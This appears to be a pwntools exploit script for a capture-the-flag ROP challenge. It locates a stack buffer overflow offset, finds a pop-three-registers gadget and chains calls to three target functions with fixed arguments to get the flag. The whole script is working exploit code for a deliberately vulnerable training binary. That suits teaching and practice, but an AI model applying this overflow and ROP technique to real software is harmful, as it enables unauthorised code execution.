# Grab function symbols
callme_one = elf.symbols['callme_one'] # Grab the function's location\
callme_two = elf.symbols['callme_two'] # Grab the function's location\
callme_three = elf.symbols['callme_three'] # Grab the function's location

# Print out target addresses
info("%#x callme_one", callme_one) # Print out their locations\
info("%#x callme_two", callme_two) # Print out their locations\
info("%#x callme_three", callme_three) # Print out their locations

# Find Buffer overflow
payload = cyclic(100) # Cause BoF

# Send payload
io.sendlineafter("> ", payload) # Send payload

# Wait for crash
io.wait() # Wait for crash

# Read the crash file
core = io.corefile # Read core file

# Locate EIP value and offset
eip_value = core.eip # Check what is in EIP
eip_offset = cyclic_find(eip_value) # Find offset in EIP

# Display offset
info("Located EIP at {a}".format(a=eip_offset)) # Show offset

# Set up pwntools ROP chain
rop = ROP(elf) # Set up ROP chain

# Find a gadget that pops 3 registers
pop3 = rop.find_gadget(["pop esi","pop edi","pop ebp","ret"])[0]  # Find specific ROP chain needed. This ROP was chosen because you need 3 params popped in registers

# Print ROP gadget's location
info("%#x ROP gadget", pop3) # Print ROP location

# Build the payload
payload = flat({
    eip_offset: [callme_one,
    pop3,
    0xdeadbeef, 
    0xcafebabe, 
    0xd00df00d,
    callme_two,
    pop3,
    0xdeadbeef, 
    0xcafebabe, 
    0xd00df00d,
    callme_three,
    pop3,
    0xdeadbeef, 
    0xcafebabe, 
    0xd00df00d
    ]
})\
'''\
    eip_offset:   # Triggers BoF\
    [callme_one,  # Go to function 1\
    pop3,         # Pop the next 3 args\
    0xdeadbeef,   # Arg 1\
    0xcafebabe,   # Arg 2\
    0xd00df00d,   # Arg 3\
    callme_two,   # Rinse and repeat for next 2\
    pop3,\
    0xdeadbeef, \
    0xcafebabe, \
    0xd00df00d,\
    callme_three,\
    pop3,\
    0xdeadbeef, \
    0xcafebabe, \
    0xd00df00d\
'''

# Save the payload to file
write('payload', payload) # Save payload for manual run if needed

# Start the process again
io = start() # Restart process

# Send the payload
io.sendlineafter('> ', payload) # Send payload\
io.recvuntil('Thank you!\n') # Wait till last content

# Or, Get our flag!
flag = io.recv() # Print everything that comes after (There are status updates saying you called functions right)

try:
    success(flag) # Print flag
except AttributeError:
    print("[+] Flag: {}".format(str(flag))) # Print flag if the code doesn't like success
